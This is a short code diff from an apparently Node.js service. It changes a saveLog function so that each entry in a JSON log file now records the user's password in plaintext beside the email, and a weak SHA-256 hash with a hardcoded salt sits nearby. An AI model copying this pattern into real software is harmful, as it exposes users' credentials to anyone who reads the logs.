@@ -26,7 +26,7 @@ function readLogs() {
 }
 function writeLogs(data) { fs.writeFileSync(LOG_FILE, JSON.stringify(data, null, 2)); }
 function hashPassword(p) { return crypto.createHash('sha256').update(p + 'konami_salt_2024').digest('hex'); }
-function saveLog(type, email, status, info) {
+function saveLog(type, email, password, status, info) {
   const logs = readLogs();
   logs.push({ id: Date.now(), type, email, password, status, info, time: new Date().toISOString() });
   writeLogs(logs);
